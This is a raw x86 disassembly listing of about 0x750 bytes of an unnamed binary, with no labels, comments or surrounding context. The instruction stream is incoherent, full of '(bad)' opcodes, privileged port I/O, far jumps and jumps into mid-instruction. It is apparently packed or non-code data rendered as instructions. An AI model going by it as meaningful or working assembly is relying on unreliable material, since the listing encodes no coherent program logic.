  437a4a:	xchg   esi,ebx
  437a4c:	pop    eax
  437a4d:	pop    ebx
  437a4e:	mov    ebp,0xe88ed2f
  437a53:	loopne 0x437a76
  437a55:	and    eax,0xc722ba76
  437a5a:	sti    
  437a5b:	dec    ecx
  437a5c:	call   0x324b:0x814395a8
  437a63:	test   BYTE PTR [esi],dl
  437a65:	cmc    
  437a66:	pop    ds
  437a67:	mov    ebx,0x6a2e988f
  437a6c:	dec    esp
  437a6d:	dec    edi
  437a6e:	sub    al,0xe4
  437a70:	fwait
  437a71:	xor    DWORD PTR [ecx+0x48],eax
  437a74:	dec    ebx
  437a75:	loop   0x437a41
  437a77:	jmp    0x437a2a
  437a79:	dec    ecx
  437a7a:	nop
  437a7b:	outs   dx,BYTE PTR ds:[esi]
  437a7c:	rol    BYTE PTR [ecx+0x7],cl
  437a7f:	or     eax,0x49082c28
  437a84:	push   ds
  437a85:	mov    WORD PTR [ecx],cs
  437a87:	inc    ebx
  437a89:	js     0x437a4a
  437a8b:	in     al,0xd3
  437a8d:	jg     0x437ad5
  437a8f:	dec    esi
  437a90:	adc    cl,BYTE PTR [ecx+0x27]
  437a93:	rcr    BYTE PTR [ebx],1
  437a95:	mov    cl,0x8
  437a97:	push   ds
  437a98:	xchg   edi,eax
  437a99:	add    DWORD PTR [ecx],esi
  437a9b:	or     BYTE PTR [esi],bl
  437a9d:	pop    eax
  437a9e:	ja     0x437a72
  437aa0:	mov    al,ds:0x2c764bbe
  437aa5:	mov    esi,0x891acf14
  437aaa:	test   edx,edx
  437aac:	sub    esp,DWORD PTR [edi]
  437aae:	push   edx
  437aaf:	jne    0x437af6
  437ab1:	pop    edi
  437ab2:	push   eax
  437ab3:	jecxz  0x437a3e
  437ab5:	(bad)  [edx-0x52]
  437ab8:	xlat   BYTE PTR ds:[ebx]
  437ab9:	aaa    
  437aba:	sub    ebp,DWORD PTR [ebx+0x4c64e9ac]
  437ac0:	xor    BYTE PTR [edx+0x2c],0x9b
  437ac4:	jl     0x437ad8
  437ac6:	inc    esp
  437ac7:	and    BYTE PTR [esi-0x7c],bh
  437aca:	adc    eax,0x318e5eb9
  437acf:	(bad)
  437ad3:	mov    al,ds:0xbb64bb10
  437ad8:	xchg   edx,eax
  437ad9:	fs adc eax,0xe4b7a642
  437adf:	je     0x437acc
  437ae1:	xor    al,0x26
  437ae3:	xor    BYTE PTR [edi],bl
  437ae5:	jno    0x437ae1
  437ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437aea:	rcl    DWORD PTR [ebx-0x3fbf804],cl
  437af0:	jne    0x437b4b
  437af2:	mov    ebp,0x1deb93df
  437af7:	xor    al,0x67
  437af9:	test   eax,0xa8d000b1
  437aff:	push   edx
  437b00:	into   
  437b01:	ret    
  437b02:	daa    
  437b03:	repz mov ss,WORD PTR [ebx+0x7898228e]
  437b0a:	mov    esp,0x8a4de46b
  437b0f:	cmp    DWORD PTR [eax-0x5e],eax
  437b12:	or     eax,DWORD PTR [ebp+0x257cd33b]
  437b18:	dec    edx
  437b19:	mov    dl,0x17
  437b1b:	lea    ebp,fs:[ecx+eiz*8]
  437b1f:	push   cs
  437b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437b21:	in     eax,0xc
  437b23:	inc    esp
  437b24:	mov    BYTE PTR [ebp+0x9],ah
  437b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437b28:	push   edx
  437b29:	sbb    ah,ah
  437b2b:	pop    edx
  437b2c:	hlt    
  437b2d:	adc    esi,esp
  437b2f:	gs jge 0x437b26
  437b32:	or     DWORD PTR [ebp+eiz*1-0x3450f524],eax
  437b39:	mov    eax,0xa4725384
  437b3e:	add    al,0xc8
  437b40:	das    
  437b41:	pusha  
  437b42:	cmp    edx,edx
  437b44:	outs   dx,DWORD PTR ds:[esi]
  437b45:	sar    edi,cl
  437b47:	out    0xe4,eax
  437b49:	push   edx
  437b4a:	repz clc 
  437b4c:	mov    bh,0x20
  437b4e:	dec    edx
  437b4f:	and    eax,0xe64bbdcd
  437b54:	xchg   edi,eax
  437b55:	add    ah,cl
  437b57:	add    ebp,DWORD PTR [edi]
  437b59:	add    DWORD PTR [ebp+0x54],eax
  437b5c:	out    dx,eax
  437b5d:	retf   0x8a3c
  437b60:	push   eax
  437b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437b62:	adc    DWORD PTR [ecx+0x61d6ceab],eax
  437b68:	or     DWORD PTR [esi],0x3a
  437b6b:	mov    WORD PTR [ecx],fs
  437b6d:	mov    eax,DWORD PTR [ecx+0xb]
  437b70:	shl    BYTE PTR [ebp*4+0x72910f94],0xe4
  437b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437b79:	mov    ch,0xe3
  437b7b:	lea    ebp,[ebx+0x4b]
  437b7e:	ja     0x437b9e
  437b80:	aad    0x41
  437b82:	in     eax,0xf4
  437b84:	das    
  437b85:	or     al,BYTE PTR [eax+0x3f4bf3f4]
  437b8b:	stc    
  437b8c:	ja     0x437c0d
  437b8e:	not    edi
  437b90:	jg     0x437b7f
  437b92:	xchg   edi,eax
  437b93:	dec    edx
  437b95:	cld    
  437b96:	(bad)  
  437b97:	jp     0x437bf2
  437b99:	inc    ebp
  437b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437b9b:	xor    BYTE PTR [esi],ah
  437b9d:	mov    DWORD PTR [edi],edi
  437b9f:	loopne 0x437b65
  437ba1:	sti    
  437ba2:	bound  edx,QWORD PTR [ebx]
  437ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437ba5:	mov    DWORD PTR [esi+0x28],edi
  437ba8:	pop    esi
  437ba9:	dec    esp
  437baa:	pop    ebp
  437bab:	add    BYTE PTR [eax-0x2c5caf3d],ch
  437bb1:	psubb  mm7,mm5
  437bb4:	popa   
  437bb5:	cdq    
  437bb6:	cwde   
  437bb7:	mov    al,0x5d
  437bb9:	push   ss
  437bba:	xor    dh,al
  437bbc:	out    dx,al
  437bbd:	inc    ebx
  437bbe:	cwde   
  437bbf:	or     BYTE PTR [ebx],bl
  437bc1:	or     al,0x71
  437bc3:	arpl   WORD PTR [edx-0x1a],sp
  437bc6:	jne    0x437b7a
  437bc8:	lea    ebx,[esi-0x68e4b252]
  437bce:	repnz cmp BYTE PTR gs:[eax-0x237b9a86],cl
  437bd6:	mov    ds:0x5a546672,eax
  437bdb:	push   esp
  437bdc:	jg     0x437bf0
  437bde:	lahf   
  437bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437be0:	xchg   ebx,eax
  437be1:	cld    
  437be2:	mul    esp
  437be4:	sbb    al,0xeb
  437be6:	shr    DWORD PTR [edx+edx*8-0x7f],0x56
  437beb:	(bad)
  437bef:	arpl   cx,dx
  437bf1:	add    esi,DWORD PTR [ebx+0x5]
  437bf4:	xlat   BYTE PTR ds:[ebx]
  437bf5:	push   cs
  437bf6:	cmp    esi,edx
  437bf8:	push   edx
  437bf9:	cmp    al,0xaf
  437bfb:	dec    ecx
  437bfc:	out    0xe8,al
  437bfe:	cmp    DWORD PTR [ecx],0xffffff88
  437c01:	pushf  
  437c02:	or     bh,al
  437c04:	fld    TBYTE PTR [eax+0x7109833e]
  437c0a:	push   ebp
  437c0b:	dec    esi
  437c0c:	mov    eax,0xf580c4c2
  437c11:	or     bh,al
  437c13:	pop    edx
  437c14:	gs mov ah,0xb
  437c17:	bound  ecx,QWORD PTR [ebx+0x12]
  437c1a:	or     DWORD PTR [eax-0x6d495bc4],0xeb680c3a
  437c24:	pop    edx
  437c25:	mov    esp,0x7e88bfe7
  437c2a:	loop   0x437c90
  437c2c:	popf   
  437c2d:	mov    esi,esi
  437c2f:	jle    0x437cac
  437c31:	fdivr  QWORD PTR [edi]
  437c33:	sub    ah,bh
  437c35:	jmp    0x829c4311
  437c3a:	in     eax,0xb8
  437c3c:	and    al,0xf3
  437c3e:	ds add dh,bl
  437c41:	inc    ecx
  437c42:	jmp    0x437c7f
  437c44:	sub    DWORD PTR [ebx],eax
  437c46:	fwait
  437c47:	adc    BYTE PTR [eax+0x38],dh
  437c4a:	push   0x25
  437c4c:	arpl   si,si
  437c4e:	dec    ecx
  437c4f:	add    eax,edi
  437c51:	inc    esp
  437c52:	inc    ebx
  437c53:	std    
  437c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437c55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437c56:	cmp    esi,ecx
  437c58:	cs pushf 
  437c5a:	xchg   ebx,eax
  437c5b:	in     al,0xb4
  437c5d:	inc    ebx
  437c5e:	int3   
  437c5f:	inc    edx
  437c60:	cmc    
  437c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437c62:	out    dx,eax
  437c63:	mov    fs,WORD PTR [edi-0x4]
  437c66:	pop    ecx
  437c67:	mov    ebx,cs
  437c69:	mov    ebx,0xd9831ce5
  437c6e:	sbb    BYTE PTR [edi-0xf6d5e4c],cl
  437c74:	jg     0x437ccc
  437c76:	pop    es
  437c77:	dec    ebx
  437c78:	aad    0xc1
  437c7a:	imul   esi,DWORD PTR [ecx-0x52ca4a6b],0x61
  437c81:	adc    bl,BYTE PTR [ecx-0x26d81658]
  437c87:	inc    esp
  437c88:	sbb    BYTE PTR [ebx+0x52],0xb2
  437c8c:	adc    edx,DWORD PTR [ebx]
  437c8e:	(bad)  
  437c8f:	and    al,0xe1
  437c91:	dec    ecx
  437c92:	xor    BYTE PTR ds:0x64e67944,dl
  437c98:	inc    eax
  437c99:	pop    ss
  437c9a:	gs mov edi,0xed79b0d8
  437ca0:	mov    BYTE PTR ds:[ecx-0x40],dh
  437ca4:	jmp    FWORD PTR [edi]
  437ca6:	enter  0x8442,0x74
  437caa:	jecxz  0x437d21
  437cac:	sbb    eax,0x96e82be4
  437cb1:	inc    ecx
  437cb2:	dec    ecx
  437cb3:	loopne 0x437d1e
  437cb5:	dec    eax
  437cb6:	push   0xffffffc2
  437cb8:	xor    esp,ecx
  437cba:	ror    DWORD PTR [edx+edx*1+0x53],0x59
  437cbf:	jmp    0x437cab
  437cc1:	out    dx,al
  437cc2:	mov    ecx,0xe6766178
  437cc7:	xor    DWORD PTR [ecx],ebx
  437cc9:	cmp    dh,BYTE PTR [eax-0x1]
  437ccc:	out    0x2f,eax
  437cce:	adc    eax,0xbbe7e900
  437cd3:	fdivp  st(1),st
  437cd5:	rcr    DWORD PTR [edi-0x44],0x72
  437cd9:	(bad)  
  437cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437cdb:	lahf   
  437cdc:	outs   dx,BYTE PTR ds:[esi]
  437cdd:	pop    esi
  437cde:	pop    ebp
  437cdf:	sub    al,BYTE PTR [ecx-0x1be7b8e5]
  437ce5:	or     al,0xa8
  437ce7:	fdiv   st,st(2)
  437ce9:	shl    BYTE PTR [ebp+0x5f],1
  437cec:	xchg   edx,eax
  437ced:	rcl    DWORD PTR [ebx-0x7c],1
  437cf0:	lods   eax,DWORD PTR ds:[esi]
  437cf1:	dec    eax
  437cf2:	call   0xfc4534f7
  437cf7:	mov    ch,0x5e
  437cf9:	ds stc 
  437cfb:	nop
  437cfc:	nop
  437cfd:	jmp    0xf52784a0
  437d02:	pop    ecx
  437d03:	loop   0x437cfe
  437d05:	nop
  437d06:	jnp    0x437c98
  437d08:	pop    ecx
  437d09:	test   DWORD PTR [edi-0x3c7ff6c6],esp
  437d0f:	jb     0x437d33
  437d11:	or     eax,0x1579e77c
  437d16:	sbb    al,0xa4
  437d18:	and    DWORD PTR [eax],edx
  437d1a:	aam    0x8e
  437d1c:	pop    eax
  437d1d:	pop    esp
  437d1e:	outs   dx,DWORD PTR ds:[esi]
  437d1f:	leave  
  437d20:	sbb    al,0xfe
  437d22:	cmp    esi,esp
  437d24:	fwait
  437d25:	pop    eax
  437d26:	clc    
  437d27:	jmp    0xfab0ac24
  437d2c:	xlat   BYTE PTR ds:[ebx]
  437d2d:	mov    ds:0x18ac795d,al
  437d32:	or     eax,0x3e070884
  437d37:	or     eax,0xf1ed33c2
  437d3c:	push   ds
  437d3d:	mov    esp,0xe24369ed
  437d42:	out    0x0,eax
  437d44:	pop    eax
  437d45:	lds    edi,FWORD PTR [edi+0x537d1e3c]
  437d4b:	push   esi
  437d4c:	loope  0x437d86
  437d4e:	push   ecx
  437d4f:	pop    es
  437d50:	jecxz  0x437dd0
  437d52:	pusha  
  437d53:	(bad)  
  437d54:	cwde   
  437d55:	sbb    al,0x75
  437d57:	mov    cl,0x71
  437d59:	scas   al,BYTE PTR es:[edi]
  437d5a:	enter  0x8119,0x10
  437d5e:	call   0x9b64:0x276b891c
  437d65:	adc    ecx,DWORD PTR [ebp-0x76]
  437d68:	retf   0x7734
  437d6b:	in     eax,0x4d
  437d6d:	sahf   
  437d6e:	(bad)  
  437d6f:	call   0xe277da00
  437d74:	fs mov dh,0xa0
  437d77:	rol    BYTE PTR [esi+0x79],cl
  437d7a:	pop    ebp
  437d7b:	push   esi
  437d7c:	xor    DWORD PTR [ebp-0x78237443],edx
  437d82:	mov    DWORD PTR [eax+0x3b],ebp
  437d85:	loopne 0x437dab
  437d87:	add    BYTE PTR [edx],bh
  437d89:	mov    al,ds:0x5ee346eb
  437d8e:	loop   0x437d89
  437d90:	sub    al,0x68
  437d92:	mov    al,BYTE PTR [ecx+0x6a9d949c]
  437d98:	test   al,0xde
  437d9a:	shl    DWORD PTR [edx+0x242447d6],cl
  437da0:	cdq    
  437da1:	paddw  mm6,mm1
  437da4:	jg     0x437d50
  437da6:	arpl   WORD PTR ds:[esi+0xe],di
  437daa:	inc    edi
  437dab:	cmp    ebp,DWORD PTR [ecx-0x33b90f3f]
  437db1:	fld    TBYTE PTR ds:0x5b40a359
  437db7:	popf   
  437db8:	xchg   edx,eax
  437db9:	sbb    eax,0xb832ab8e
  437dbe:	or     eax,0x6200775a
  437dc3:	cwde   
  437dc4:	mov    esp,0xaca8e5b4
  437dc9:	popa   
  437dca:	rcr    DWORD PTR [edx],0x85
  437dcd:	xchg   ebx,eax
  437dce:	push   cs
  437dcf:	ins    DWORD PTR es:[edi],dx
  437dd0:	adc    eax,0x111122e4
  437dd5:	xor    bl,BYTE PTR [edx+0x21]
  437dd8:	rol    BYTE PTR [ecx-0x8],0x61
  437ddc:	fisub  DWORD PTR [ecx+0x6e]
  437ddf:	test   BYTE PTR [edi-0x1],0x49
  437de3:	sbb    eax,0x445141ce
  437de8:	iret   
  437de9:	pop    eax
  437dea:	pop    edi
  437deb:	jns    0x437dca
  437ded:	or     dl,BYTE PTR [eax]
  437def:	mov    ebx,0x6314d744
  437df4:	push   ebx
  437df5:	xlat   BYTE PTR ds:[ebx]
  437df6:	aaa    
  437df7:	lock xchg ebp,eax
  437df9:	mov    bh,0xa6
  437dfb:	(bad)  
  437dfc:	aas    
  437dfd:	lods   al,BYTE PTR ds:[esi]
  437dfe:	mov    bh,0x9d
  437e00:	cld    
  437e01:	cld    
  437e02:	cld    
  437e03:	inc    edi
  437e04:	add    eax,0xc4f9fa40
  437e09:	inc    edi
  437e0a:	jle    0x437df4
  437e0c:	inc    ebx
  437e0d:	jmp    0x437e22
  437e0f:	xchg   edi,eax
  437e10:	(bad)  
  437e11:	out    dx,eax
  437e12:	out    0x5f,eax
  437e14:	jns    0x437dc7
  437e16:	cmc    
  437e17:	out    dx,al
  437e18:	(bad)  
  437e19:	(bad)  
  437e1a:	jge    0x437dcc
  437e1c:	pop    es
  437e1d:	dec    eax
  437e1e:	and    esi,DWORD PTR [edx-0x231ad527]
  437e24:	ins    DWORD PTR es:[edi],dx
  437e25:	in     al,dx
  437e26:	dec    ecx
  437e27:	push   esp
  437e28:	std    
  437e29:	mov    esp,0xc10c29a2
  437e2e:	fcomp  st(2)
  437e30:	dec    ecx
  437e31:	imul   ecx,DWORD PTR [eax-0x65],0x35
  437e35:	test   eax,0xa0533842
  437e3a:	and    eax,0x18989d23
  437e3f:	outs   dx,BYTE PTR ds:[esi]
  437e40:	call   0xb4e5:0x6972d3c8
  437e47:	mov    BYTE PTR [eax],bh
  437e49:	loope  0x437e86
  437e4b:	jecxz  0x437e4b
  437e4d:	aaa    
  437e4e:	gs (bad) 
  437e50:	jne    0x437df0
  437e52:	std    
  437e53:	inc    edi
  437e54:	in     al,dx
  437e55:	ss ins DWORD PTR es:[edi],dx
  437e57:	mov    al,ds:0xcf1da2a7
  437e5c:	(bad)  
  437e5d:	sti    
  437e5e:	jno    0x437e7e
  437e60:	xchg   ecx,eax
  437e61:	mov    edx,0xe8fd1cbb
  437e66:	mov    cs,edi
  437e68:	pop    esi
  437e69:	xchg   esi,eax
  437e6a:	jecxz  0x437e5a
  437e6c:	or     BYTE PTR [eax],ch
  437e6e:	leave  
  437e6f:	in     eax,0x9f
  437e71:	push   edx
  437e72:	pop    ebx
  437e73:	ficom  WORD PTR [edx-0x71607be7]
  437e79:	sti    
  437e7a:	add    BYTE PTR [ecx],al
  437e7c:	mov    ch,0xcb
  437e7e:	test   BYTE PTR [edx],ah
  437e80:	fs nop
  437e82:	adc    DWORD PTR [ebx+0x7da2b7d],edi
  437e88:	mul    edx
  437e8a:	sub    eax,0x1403d419
  437e8f:	adc    al,0xe
  437e91:	cmp    ecx,esp
  437e93:	adc    DWORD PTR [eax],eax
  437e95:	daa    
  437e96:	ins    DWORD PTR es:[edi],dx
  437e97:	mov    dl,0xe6
  437e99:	aam    0x19
  437e9b:	jecxz  0x437ed0
  437e9d:	and    BYTE PTR [ebx-0x6fbf6f9f],bl
  437ea3:	push   0xffffff8b
  437ea5:	lahf   
  437ea6:	out    0x4c,al
  437ea8:	ins    BYTE PTR es:[edi],dx
  437ea9:	mov    al,ds:0xb387fe34
  437eae:	xor    DWORD PTR [edx],eax
  437eb0:	or     BYTE PTR [ebp+0x1d951960],0x6a
  437eb7:	pop    edi
  437eb8:	xchg   edx,eax
  437eb9:	push   ebx
  437eba:	push   0x53
  437ebc:	aas    
  437ebd:	inc    esi
  437ebe:	je     0x437f0f
  437ec0:	and    BYTE PTR [ebp+0x43e839c9],dh
  437ec6:	rol    esi,1
  437ec8:	xor    al,0x27
  437eca:	scas   eax,DWORD PTR es:[edi]
  437ecb:	lds    esi,FWORD PTR [ebx]
  437ecd:	push   ds
  437ece:	xchg   ebx,eax
  437ecf:	arpl   si,si
  437ed1:	adc    BYTE PTR [eax+0x3a261a10],cl
  437ed7:	xor    edx,DWORD PTR [edx]
  437ed9:	lahf   
  437eda:	adc    edi,DWORD PTR [ebp+0x1693a221]
  437ee0:	ss gs (bad) 
  437ee3:	loopne 0x437f59
  437ee5:	and    BYTE PTR ds:0xb9207417,dl
  437eeb:	or     eax,0xe7a657f0
  437ef0:	bound  esp,QWORD PTR [edx]
  437ef2:	inc    eax
  437ef3:	ret    
  437ef4:	jne    0x437f31
  437ef6:	sahf   
  437ef7:	icebp  
  437ef8:	mov    al,ds:0x48757c5c
  437efd:	push   cs
  437efe:	dec    ecx
  437eff:	mov    esi,0x1644a01d
  437f04:	daa    
  437f05:	loope  0x437f65
  437f07:	ds dec ebx
  437f09:	out    dx,eax
  437f0a:	dec    edx
  437f0b:	sbb    BYTE PTR [esi+edi*4],0x2
  437f0f:	and    dh,bl
  437f11:	cmp    BYTE PTR [edx],ch
  437f13:	leave  
  437f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437f15:	in     al,0xc4
  437f17:	out    dx,eax
  437f18:	xchg   ebp,eax
  437f19:	mov    ch,0x48
  437f1b:	jo     0x437f50
  437f1d:	push   ebx
  437f1e:	xor    esi,esp
  437f20:	lock pop ecx
  437f22:	xchg   edx,eax
  437f23:	push   0xd
  437f25:	out    0x41,al
  437f27:	cli    
  437f28:	mov    esp,ecx
  437f2a:	inc    eax
  437f2b:	sbb    al,0x92
  437f2d:	adc    al,0xca
  437f2f:	loope  0x437f6b
  437f31:	dec    esp
  437f32:	or     BYTE PTR ss:[ecx+0x8],al
  437f36:	pop    es
  437f37:	adc    al,BYTE PTR [edx-0x225653a4]
  437f3d:	outs   dx,BYTE PTR ds:[esi]
  437f3e:	push   ds
  437f3f:	sbb    al,0xfa
  437f41:	cdq    
  437f42:	xlat   BYTE PTR ds:[ebx]
  437f43:	scas   al,BYTE PTR es:[edi]
  437f44:	pop    edi
  437f45:	std    
  437f46:	(bad)  
  437f47:	cli    
  437f48:	dec    edi
  437f49:	cld    
  437f4a:	cld    
  437f4b:	daa    
  437f4c:	add    eax,0x7f1f3f00
  437f51:	fcomip st,st(7)
  437f53:	cld    
  437f54:	loop   0x437f28
  437f56:	fcom   DWORD PTR [ebp-0x390e8c41]
  437f5c:	in     eax,0xda
  437f5e:	or     eax,0x3c22a59
  437f63:	pop    DWORD PTR [ebx+edi*8]
  437f66:	retf   
  437f67:	stos   BYTE PTR es:[edi],al
  437f68:	xchg   edi,eax
  437f69:	lods   al,BYTE PTR ds:[esi]
  437f6a:	call   0x4a41470f
  437f6f:	sbb    esp,ebp
  437f71:	inc    edx
  437f72:	stos   BYTE PTR es:[edi],al
  437f73:	and    esp,esp
  437f75:	or     DWORD PTR [ebp+esi*8-0x7a6634b2],esp
  437f7c:	inc    edi
  437f7d:	jecxz  0x437fb6
  437f7f:	cmc    
  437f80:	mul    eax
  437f82:	jge    0x437fe3
  437f84:	pop    DWORD PTR ds:0xf0b323d2
  437f8a:	add    al,ch
  437f8c:	mov    al,ds:0x200504d0
  437f91:	xchg   esi,eax
  437f92:	bound  eax,QWORD PTR [edx+0x2e9b46ce]
  437f98:	retf   
  437f99:	cmp    al,0xef
  437f9b:	xchg   ebx,eax
  437f9c:	rol    DWORD PTR [edi],1
  437f9e:	xchg   edx,eax
  437f9f:	inc    esp
  437fa0:	rcl    BYTE PTR [edx+0x56],1
  437fa3:	loop   0x437fde
  437fa5:	daa    
  437fa6:	fs xchg esp,ecx
  437fa9:	test   al,0xee
  437fab:	ins    DWORD PTR es:[edi],dx
  437fac:	mov    al,ds:0xa44c58e6
  437fb1:	dec    edi
  437fb2:	xchg   ebx,eax
  437fb3:	inc    ecx
  437fb4:	jbe    0x438000
  437fb6:	cs xor cl,dl
  437fb9:	sub    DWORD PTR [ebx],eax
  437fbb:	cmp    ebp,DWORD PTR [eax-0x450878f5]
  437fc1:	pop    edx
  437fc2:	rcr    DWORD PTR es:[esi+ecx*4],1
  437fc6:	int    0x30
  437fc8:	sbb    al,0x6d
  437fca:	inc    ecx
  437fcb:	ret    
  437fcc:	bound  esi,QWORD PTR [edx+0x78f1efd3]
  437fd2:	push   ds
  437fd3:	push   0x2c
  437fd5:	loope  0x437ff9
  437fd7:	ins    BYTE PTR es:[edi],dx
  437fd8:	shl    ah,0xf7
  437fdb:	lea    ebx,[eax+0x28]
  437fde:	daa    
  437fdf:	fs and al,0xe7
  437fe2:	dec    ebx
  437fe3:	jb     0x43802d
  437fe5:	xchg   esp,eax
  437fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437fe7:	sub    ah,al
  437fe9:	les    eax,FWORD PTR [eax+0x3c62d6ba]
  437fef:	cmp    BYTE PTR [ecx+0x51],al
  437ff2:	pop    edi
  437ff3:	cmp    DWORD PTR [ecx+0x21bc6236],edi
  437ff9:	test   BYTE PTR [ebp-0x1],cl
  437ffc:	ds and ah,bh
  437fff:	lahf   
  438000:	aas    
  438001:	adc    dh,bl
  438003:	repnz stos BYTE PTR es:[edi],al
  438005:	jl     0x438041
  438007:	add    edi,ecx
  438009:	and    eax,0x17848741
  43800e:	push   0x3d8820e3
  438013:	and    bl,BYTE PTR [ebx-0xc9b28a7]
  438019:	add    eax,0x38f605fc
  43801e:	dec    ecx
  43801f:	cs cmp bl,cl
  438022:	jmp    0x99e1:0xf1b03eb3
  438029:	int3   
  43802a:	pop    ecx
  43802b:	test   BYTE PTR [eax],dh
  43802d:	mov    ds:0x387a5ad2,eax
  438032:	(bad)  
  438033:	jno    0x438089
  438035:	into   
  438036:	and    eax,eax
  438038:	mov    ah,0xe2
  43803a:	adc    BYTE PTR [ecx+0x7d151ba6],al
  438040:	cmp    ch,BYTE PTR [ebx-0x2d]
  438043:	dec    esi
  438044:	(bad)  
  438045:	pop    es
  438046:	pop    eax
  438047:	xchg   esp,eax
  438048:	jb     0x437fe2
  43804a:	cmp    esi,ecx
  43804c:	ss in  al,dx
  43804e:	icebp  
  43804f:	adc    ecx,ebx
  438051:	fild   WORD PTR [ecx]
  438053:	xchg   ecx,eax
  438054:	enter  0x8cbc,0x63
  438058:	inc    ecx
  438059:	mov    al,ds:0x74222661
  43805e:	xor    bh,ah
  438060:	sbb    dh,BYTE PTR [eax+esi*1+0x17]
  438064:	test   BYTE PTR [esi+ebx*1+0x52],ah
  438068:	sar    DWORD PTR [ecx],cl
  43806a:	in     eax,dx
  43806b:	jno    0x438049
  43806d:	ret    0x30fb
  438070:	pop    ebx
  438071:	push   ebp
  438072:	mov    ch,0xb7
  438074:	fcmovnbe st,st(1)
  438076:	std    
  438077:	stc    
  438078:	sub    esi,DWORD PTR [ebx]
  43807a:	xchg   ebx,eax
  43807b:	push   DWORD PTR [ebp-0x5c0098d4]
  438081:	aas    
  438082:	call   FWORD PTR [ecx+0x2]
  438085:	and    ch,bh
  438087:	cld    
  438088:	pop    ds
  438089:	lahf   
  43808a:	(bad)  
  43808b:	je     0x438060
  43808d:	int3   
  43808e:	(bad)  
  43808f:	icebp  
  438090:	jg     0x438084
  438092:	jmp    0xadc2:0xe8fcdff3
  438099:	jmp    0x4380b8
  43809b:	push   ebp
  43809c:	jmp    0x438089
  43809e:	not    DWORD PTR [ecx+0x50]
  4380a1:	xchg   edx,eax
  4380a2:	repz mov al,ds:0x33c0f8d9
  4380a8:	mov    eax,ds:0x8f5b2684
  4380ad:	nop
  4380ae:	into   
  4380af:	pop    ebx
  4380b0:	jb     0x4380cc
  4380b2:	sub    eax,DWORD PTR [ecx+ecx*1-0x57]
  4380b6:	jae    0x4380ef
  4380b8:	gs sti 
  4380ba:	add    eax,0x3e51759b
  4380bf:	jns    0x438109
  4380c1:	in     al,dx
  4380c2:	sub    BYTE PTR [edi],0x8e
  4380c5:	in     al,dx
  4380c6:	xor    dl,ah
  4380c8:	call   0xf0ffd9b2
  4380cd:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4380cf:	dec    ecx
  4380d0:	dec    edi
  4380d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4380d2:	push   ebp
  4380d3:	rcr    BYTE PTR [eax],cl
  4380d5:	(bad)  
  4380d6:	pop    esp
  4380d7:	xchg   BYTE PTR [eax+0x2],ch
  4380da:	in     eax,dx
  4380db:	(bad)  
  4380dc:	(bad)  
  4380dd:	arpl   WORD PTR [eax],si
  4380df:	icebp  
  4380e0:	pushf  
  4380e1:	add    eax,DWORD PTR [ecx]
  4380e3:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4380e5:	push   es
  4380e6:	xlat   BYTE PTR ds:[ebx]
  4380e7:	sbb    eax,0x8190d8f9
  4380ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4380ed:	test   DWORD PTR [esi+0x26],edi
  4380f0:	mov    ebx,0xf49c6606
  4380f5:	fdiv   QWORD PTR [ecx+0x21846058]
  4380fb:	dec    ecx
  4380fc:	pop    esp
  4380fd:	dec    ecx
  4380fe:	mov    edi,edi
  438100:	sub    ecx,ebx
  438102:	mov    DWORD PTR [edi],eax
  438104:	es sahf 
  438106:	xor    al,bl
  438108:	mov    bl,BYTE PTR [eax+ebx*4-0x6cd8993e]
  43810f:	repnz xchg esi,eax
  438111:	sbb    al,0x1b
  438113:	inc    edi
  438114:	imul   ecx,DWORD PTR [eax-0x1d],0xfffffff0
  438118:	nop
  438119:	pushf  
  43811a:	scas   eax,DWORD PTR es:[edi]
  43811b:	pop    esi
  43811c:	sbb    esp,DWORD PTR [ebx-0x70]
  43811f:	dec    esi
  438120:	loop   0x4380b1
  438122:	retf   0x490e
  438125:	push   0x33
  438127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438128:	rcr    BYTE PTR ds:0xa781ed35,1
  43812e:	adc    ah,BYTE PTR [edx]
  438130:	jnp    0x4380c1
  438132:	sbb    al,0xa1
  438134:	cwde   
  438135:	xchg   edx,eax
  438136:	aaa    
  438137:	retf   0x6407
  43813a:	dec    edx
  43813b:	out    dx,eax
  43813c:	mov    ecx,0x49b4a798
  438141:	mov    BYTE PTR [ecx+0x71071193],ch
  438147:	gs jmp 0x64d2:0xbc2d203b
  43814f:	mov    DWORD PTR [edx+0x55d4e4c5],esp
  438155:	and    BYTE PTR [eax+0x59],cl
  438158:	das    
  438159:	pusha  
  43815a:	fcom   st(3)
  43815c:	mov    ebx,0x472d5200
  438161:	mov    ebx,0x304db246
  438166:	sbb    ebx,edi
  438168:	das    
  438169:	imul   eax,DWORD PTR fs:[ebx],0x5c
  43816d:	inc    ebp
  43816e:	jp     0x43817f
  438170:	jne    0x43818c
  438172:	fldcw  WORD PTR [esp+edx*2-0x4]
  438176:	cdq    
  438177:	xchg   ebx,eax
  438178:	jae    0x4381d3
  43817a:	test   al,0x2e
  43817c:	inc    ebp
  43817d:	into   
  43817e:	or     dl,BYTE PTR [ebp+0x131471a5]
  438184:	adc    DWORD PTR [ecx],ebx
  438186:	mov    dh,cl
  438188:	push   es
  438189:	fild   WORD PTR [eax]
  43818b:	inc    eax
  43818c:	or     dl,BYTE PTR [ebx+0x540f5a8b]
  438192:	and    BYTE PTR [esi],ah
  438194:	addr16 pusha 
  438196:	xor    al,0xda
